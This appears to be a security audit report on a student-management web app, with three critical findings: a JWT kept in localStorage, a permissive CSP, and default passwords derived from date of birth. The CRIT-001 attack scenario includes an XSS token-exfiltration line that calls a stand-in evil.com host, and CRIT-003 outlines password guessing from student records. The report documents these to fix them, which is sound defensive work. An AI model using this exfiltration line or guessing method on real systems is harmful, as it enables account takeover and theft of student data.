# Critical Severity Findings

> **3 Critical findings identified.** These must be remediated before any production deployment.

---

## CRIT-001 — JWT Token Stored in localStorage (XSS-Accessible)

| Field | Value |
|-------|-------|
| **Finding ID** | CRIT-001 |
| **Severity** | 🔴 Critical |
| **CVSS Score** | 9.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) |
| **OWASP Top 10** | A02:2021 – Cryptographic Failures / A07:2021 – Identification & Authentication Failures |
| **OWASP API** | API2:2023 – Broken Authentication |
| **CWE** | CWE-312: Cleartext Storage of Sensitive Information, CWE-922: Insecure Storage of Sensitive Information |
| **MITRE ATT&CK** | T1539 – Steal Web Session Cookie |
| **MITRE CAPEC** | CAPEC-60 – Reusing Session IDs |

### Affected Locations

| File | Line | Code |
|------|------|------|
| `src/store/authContext.tsx` | 63–71 | `localStorage.setItem('spdms_token', token)` |
| `src/store/authContext.tsx` | 66 | `localStorage.setItem('token', token)` |
| `src/store/authStore.ts` | 36–42 | `localStorage.setItem('auth_token', token)` |
| `src/features/auth/LoginPage.tsx` | 44–46 | `localStorage.setItem('spdms_token', token)` |
| `src/features/auth/pages/CaptainLoginPage.tsx` | 24–26 | `localStorage.setItem('spdms_token', token)` |
| `src/api/client.ts` | 17 | `const token = localStorage.getItem('spdms_token') \|\| localStorage.getItem('auth_token') \|\| localStorage.getItem('token')` |

### Vulnerable Code

```typescript
// src/store/authContext.tsx — lines 63-71
useEffect(() => {
  if (token) {
    localStorage.setItem('spdms_token', token);  // VULNERABLE
    localStorage.setItem('token', token);          // VULNERABLE
  } else {
    localStorage.removeItem('spdms_token');
    localStorage.removeItem('token');
  }
}, [token]);
```

```typescript
// src/features/auth/pages/CaptainLoginPage.tsx — lines 24-26
localStorage.setItem('spdms_token', token);       // VULNERABLE
localStorage.setItem('spdms_user', JSON.stringify(user));
localStorage.setItem('auth_token', token);         // VULNERABLE
```

### Explanation

`localStorage` is accessible to any JavaScript running on the same origin. If an XSS vulnerability exists anywhere in the application (or in any third-party script loaded from the same origin), an attacker can execute `localStorage.getItem('spdms_token')` and steal the JWT token with a single line of JavaScript.

There are **five separate locations** where the token is written to `localStorage`, and the application also stores the full `user` object (containing PII like email, name, roles, studentId) in `localStorage` as JSON.

Additionally, two parallel storage key names (`spdms_token` and `auth_token`/`token`) are maintained simultaneously in two different stores (`authContext` and `authStore`), increasing the attack surface.

### Attack Scenario

1. Attacker finds any XSS vector in the application (e.g., a student name rendered from the API that contains `<script>alert(1)</script>`).
2. Attacker injects: `fetch('https://evil.com/steal?t='+localStorage.getItem('spdms_token'))`
3. Attacker receives the admin JWT token.
4. Attacker uses the token to call `/api/v1/admin/users`, `/api/v1/students`, and other privileged endpoints directly.
5. Full account takeover and data exfiltration of all student PII.

### Business Impact

Complete compromise of admin, teacher, or student accounts. Exfiltration of all student PII including names, DOBs, addresses, guardian contact details, discipline records, and attendance history.

### Recommended Fix

Replace `localStorage` token storage with `httpOnly` cookies set by the backend:

```typescript
// SECURE PATTERN: Do NOT store the token in JavaScript-accessible storage.
// The backend should set: Set-Cookie: spdms_token=<jwt>; HttpOnly; Secure; SameSite=Strict

// On the frontend, simply allow cookies to be sent automatically:
export const apiClient = axios.create({
  baseURL,
  withCredentials: true, // Sends httpOnly cookie automatically
  headers: { 'Content-Type': 'application/json' },
});

// Remove ALL localStorage.setItem calls for token/auth_token/spdms_token
// Remove the request interceptor that reads from localStorage
```

If `httpOnly` cookies are not feasible in the short term, use `sessionStorage` (not `localStorage`) so tokens are cleared on tab close, and ensure the CSP is tightened to prevent XSS.

**Confidence: HIGH** — Confirmed by direct code inspection across 5 files.

---

## CRIT-002 — Content Security Policy Allows `unsafe-inline` and `unsafe-eval`

| Field | Value |
|-------|-------|
| **Finding ID** | CRIT-002 |
| **Severity** | 🔴 Critical |
| **CVSS Score** | 8.8 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) |
| **OWASP Top 10** | A03:2021 – Injection (XSS) |
| **CWE** | CWE-693: Protection Mechanism Failure, CWE-79: Cross-Site Scripting |
| **MITRE ATT&CK** | T1059.007 – JavaScript |
| **MITRE CAPEC** | CAPEC-86 – XSS via HTTP Request Headers |

### Affected Location

**File:** `index.html` — **Line 9**

### Vulnerable Code

```html
<meta http-equiv="Content-Security-Policy" 
  content="default-src 'self' http://localhost:8080 ws://localhost:5173; 
           script-src 'self' 'unsafe-inline' 'unsafe-eval'; 
           style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; 
           font-src 'self' https://fonts.gstatic.com data:; 
           img-src 'self' data: blob: http://localhost:8080;" />
```

### Why This Is Vulnerable

The `script-src` directive contains both `'unsafe-inline'` and `'unsafe-eval'`:

- **`'unsafe-inline'`**: Allows inline `<script>` tags and `javascript:` URLs to execute. This completely defeats XSS protection — any injected `<script>` tag will run.
- **`'unsafe-eval'`**: Allows `eval()`, `Function()`, `setTimeout(string)` and other dynamic code execution. This enables prototype pollution attacks and dynamic code injection.

Additionally, the CSP is delivered as a `<meta>` tag rather than an HTTP response header, which means:
- It cannot set `frame-ancestors` (clickjacking protection requires HTTP header).
- It may be bypassed or not respected by some older browsers.
- It does not protect against the initial HTML download itself.

The CSP also hard-codes `http://localhost:8080` in `default-src` and the WebSocket `ws://localhost:5173` — these are development-only values that should not appear in production builds.

### Attack Scenario

Any stored or reflected XSS in student names, activity names, or badge names rendered from the API bypasses CSP entirely due to `unsafe-inline`, allowing arbitrary script execution.

### Recommended Fix

```html
<!-- SECURE CSP — use nonce-based approach -->
<meta http-equiv="Content-Security-Policy" 
  content="default-src 'self'; 
           script-src 'self' 'nonce-{RANDOM_NONCE}'; 
           style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; 
           font-src 'self' https://fonts.gstatic.com; 
           img-src 'self' data: blob:; 
           connect-src 'self' https://api.pragatix.example.com; 
           frame-ancestors 'none';" />
```

For production, serve the CSP as an HTTP response header (not meta tag) and replace `localhost` references with production domains.

**Confidence: HIGH** — Confirmed in `index.html` line 9.

---

## CRIT-003 — Predictable / Hardcoded Default Passwords for New Students

| Field | Value |
|-------|-------|
| **Finding ID** | CRIT-003 |
| **Severity** | 🔴 Critical |
| **CVSS Score** | 9.0 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) |
| **OWASP Top 10** | A07:2021 – Identification and Authentication Failures |
| **CWE** | CWE-521: Weak Password Requirements, CWE-798: Use of Hardcoded Credentials |
| **MITRE ATT&CK** | T1110.001 – Password Guessing |
| **MITRE CAPEC** | CAPEC-70 – Try Common/Default Usernames and Passwords |

### Affected Location

**File:** `src/features/admin/tabs/StudentsTab.tsx` — **Lines 311–319**

### Vulnerable Code

```typescript
// src/features/admin/tabs/StudentsTab.tsx — Lines 311–319
payload.regNo = formData.regNo.trim();
let pass = formData.password.trim();
if (!pass && formData.dob) {
  const parts = formData.dob.split('-');
  if (parts.length === 3) {
    pass = `${parts[2]}${parts[1]}${parts[0]}`;  // VULNERABLE: e.g., DOB 2003-05-15 → password "15052003"
  }
}
payload.password = pass || '123456';  // VULNERABLE: hardcoded fallback '123456'
```

### Why This Is Vulnerable

When an admin creates a new student without explicitly setting a password:

1. **Primary fallback**: The password is automatically set to the student's date of birth in `DDMMYYYY` format. This is predictable and derivable from public or semi-public student records.
2. **Secondary fallback**: If no DOB is provided, the password defaults to the literal string `'123456'` — one of the most commonly used passwords globally.

An attacker with access to a student list (which includes DOBs in the student management interface) can log into any student account created through the admin panel.

### Attack Scenario

1. Attacker gains access to a student list export (or social engineers a student's DOB).
2. Attacker attempts login at `/student` portal with `username=<regNo>` and `password=<DDMMYYYY>`.
3. Attacker immediately accesses the student's discipline score, XP history, and personal profile.
4. If the student is a CAPTAIN, attacker gains access to the captain group management interface.

### Recommended Fix

```typescript
// SECURE: Generate a cryptographically random temporary password
// Backend should send a welcome email with a one-time setup link

// Option 1: Generate random password client-side (still better than DOB)
import { randomBytes } from 'crypto'; // Node/backend pattern
// On frontend, prompt admin to set the password — do NOT auto-generate

// Option 2 (Recommended): Remove password field from create form entirely.
// Backend generates secure temp password and emails student directly.
// Force password change on first login.

// At minimum — remove the DOB-based and '123456' fallbacks:
if (!formData.password.trim()) {
  toast.error('Password is required for new student registration.');
  return;
}
payload.password = formData.password.trim();
```

**Confidence: HIGH** — Confirmed by direct code inspection, lines 311–319 of `StudentsTab.tsx`.
